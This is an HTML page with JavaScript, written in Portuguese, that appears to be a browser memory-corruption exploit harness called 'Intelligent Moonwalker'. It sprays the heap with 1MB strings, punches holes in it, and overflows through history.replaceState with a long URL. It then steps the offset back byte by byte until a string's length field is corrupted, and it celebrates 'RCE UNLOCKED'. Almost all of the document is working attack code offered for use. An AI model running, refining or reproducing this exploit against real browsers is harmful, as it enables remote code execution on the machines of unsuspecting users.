<!DOCTYPE html>
<html>
<head>
    <title>Intelligent Moonwalker (1MB)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; margin-bottom: 20px; }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #0f0; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white; }
        .data { color: yellow; font-weight: bold; }
        .miss { color: #555; }
    </style>
</head>
<body>

    <h1>Intelligent Moonwalker</h1>
    <p>Trava nos dados e recua byte a byte até achar o Length.</p>

    <button onclick="startSmartWalk()">INICIAR RASTREAMENTO INTELIGENTE</button>
    <button onclick="stop()" style="border-color:red; color:red">PARAR</button>
    
    <div id="log">Pronto. Offset Inicial: 709520</div>

    <script>
        // Começamos no ponto confirmado de DADOS
        let currentOffset = 709520; 
        const OVERFLOW_AMT = 1024 * 64; 

        // Configuração VENCEDORA (1MB TextDecoder)
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];
        var isRunning = false;

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : (type === 'data' ? 'class="data"' : (type === 'miss' ? 'class="miss"' : ''));
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function stop() { isRunning = false; log("Parando..."); }

        async function startSmartWalk() {
            if(isRunning) return;
            isRunning = true;
            log("Iniciando varredura inteligente...");

            // Limite de segurança (se recuar mais que 64 bytes, algo está errado)
            const LIMIT_OFFSET = 709456; 

            while(isRunning && currentOffset > LIMIT_OFFSET) {
                
                // Limpeza
                victims = [];
                await forceGC();
                // Delay para estabilizar o Heap
                await new Promise(r => setTimeout(r, 50));

                try {
                    // 1. SPRAY (Recriando o ambiente de sucesso)
                    let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
                    rawBuffer.fill(0x42); 
                    let decoder = new TextDecoder("utf-8");
                    let baseString = decoder.decode(rawBuffer);

                    // Aumentei um pouco a quantidade para garantir colisão
                    for(let i=0; i<100; i++) {
                        let s = i + "_" + baseString.substring((i+"_").length);
                        victims.push(s);
                    }

                    // 2. BURACOS
                    for(let i=0; i<100; i+=2) victims[i] = null;
                    await forceGC();

                    // 3. EXPLOIT
                    let buffer = "A".repeat(currentOffset);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    history.replaceState({}, "smart_walk", "/" + buffer);

                    // 4. CHECAGEM E DECISÃO
                    let result = checkResult();

                    if (result === "RCE") {
                        isRunning = false;
                        return; // VENCEU!
                    } 
                    else if (result === "DATA") {
                        log(`[${currentOffset}] DADOS confirmados. Recuando 1 byte...`, 'data');
                        currentOffset--; // Só recua se tiver certeza que acertou
                    } 
                    else {
                        // Se errou (Miss), NÃO muda o offset. Tenta de novo até alinhar.
                        log(`[${currentOffset}] Spray falhou (Miss). Tentando novamente...`, 'miss');
                    }

                } catch(e) {
                    log("Erro crítico (Reiniciando ciclo): " + e.message);
                    await new Promise(r => setTimeout(r, 1000));
                }
            }
            if(isRunning) log("Limite de recuo atingido.");
        }

        function checkResult() {
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO SUPREMO (Length)
                    if (msg.length !== PAYLOAD_SIZE) {
                        log(`!!! JACKPOT !!! Length Corrompido!`, 'win');
                        log(`OFFSET MÁGICO: ${currentOffset}`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert(`RCE UNLOCKED NO OFFSET ${currentOffset}!`);
                        return "RCE";
                    }

                    // SUCESSO PARCIAL (Dados)
                    if (msg.charCodeAt(0) === 1) {
                        return "DATA";
                    }
                } catch(e) {}
            }
            return "MISS";
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 200));
        }
    </script>
</body>
</html>
